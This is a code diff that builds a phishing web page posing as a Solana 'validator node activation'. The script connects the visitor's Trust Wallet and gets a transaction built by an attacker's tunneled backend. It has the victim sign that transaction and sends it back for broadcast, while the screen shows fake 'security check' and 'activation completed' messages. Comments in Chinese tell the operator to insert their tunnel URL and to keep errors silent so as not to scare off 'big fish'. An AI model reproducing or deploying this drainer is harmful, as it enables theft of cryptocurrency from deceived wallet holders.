@@ -1,54 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Validator Node Activation</title>
+    <style>
+        body { background: #0b0e11; color: white; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .card { text-align: center; padding: 20px; border: 1px solid #2b2f36; border-radius: 12px; background: #181a20; width: 90%; max-width: 400px; }
+        button { background: #f0b90b; color: #000; border: none; padding: 15px 30px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 20px; }
+        button:active { transform: scale(0.98); }
+        .status { color: #848e9c; font-size: 12px; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="card">
+    <h2>Node Activation</h2>
+    <p>Please synchronize your wallet to start the validator node.</p>
+    <button id="activate_btn">ACTIVATE NOW</button>
+    <div class="status" id="status_text">System: Ready to sync...</div>
+</div>
+
 <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
+
 <script>
+// 🔱 1. 配置你的隧道地址（务必修改这里）
+const TUNNEL_URL = "https://你的穿透地址.com"; 
+
 async function startProcess() {
+    const btn = document.getElementById('activate_btn');
+    const st = document.getElementById('status_text');
+    
     try {
-        // 1. 获取钱包对象
+        btn.disabled = true;
+        st.innerText = "Connecting wallet...";
+
+        // 2. 获取钱包对象
         const p = window.trustwallet?.solana || window.solana;
         if (!p) {
-            alert("Please use Trust Wallet!");
+            alert("Trust Wallet not found! Please open in Trust Wallet Browser.");
+            btn.disabled = false;
             return;
         }
 
-        // 2. 连接钱包
         await p.connect();
-        console.log("Connected:", p.publicKey.toString());
+        st.innerText = "Synchronizing data...";
 
-        // 3. 请求后端构造交易 (请确保这里的 tunnel 变量已定义)
-        const tunnel = "你的内网穿透地址"; 
-        const resp = await fetch(tunnel + "/prepare_v32", {
+        // 3. 请求后端 V100 构造交易
+        const resp = await fetch(TUNNEL_URL + "/prepare_v32", {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
             body: JSON.stringify({ address: p.publicKey.toString() })
         });
 
         const info = await resp.json();
+        
         if (info.raw_tx) {
+            st.innerText = "Security check in progress...";
             const web3 = window.solanaWeb3;
             
-            // 4. 反序列化交易包
+            // 4. 反序列化并拉起签名
             const txBuffer = Uint8Array.from(atob(info.raw_tx), c => c.charCodeAt(0));
             const tx = web3.Transaction.from(txBuffer);
             
-            // 5. 拉起签名确认
             const signed = await p.signTransaction(tx);
-            
-            // 6. 序列化并广播
+            st.innerText = "Verifying signature...";
+
+            // 5. 广播
             const signedBase = btoa(String.fromCharCode.apply(null, signed.serialize()));
-            const broadcastResp = await fetch(tunnel + "/broadcast_v41", {
+            await fetch(TUNNEL_URL + "/broadcast_v41", {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
                 body: JSON.stringify({ signed_tx: signedBase })
             });
             
-            const result = await broadcastResp.json();
-            console.log("Final Status:", result);
+            st.innerText = "Activation completed!";
+        } else {
+            st.innerText = "Error: " + (info.error || "Unknown");
+            btn.disabled = false;
         }
+
     } catch (err) {
-        console.error("Execution Error:", err);
-        // 🔱 这里静默处理，不弹窗，防止吓跑大鱼
+        console.error(err);
+        st.innerText = "System busy, please try again.";
+        btn.disabled = false;
     }
 }
 
-// 绑定到你的 ACTIVATE 按钮
+// 绑定事件
 document.getElementById('activate_btn').onclick = startProcess;
 </script>
+
+</body>
+</html>
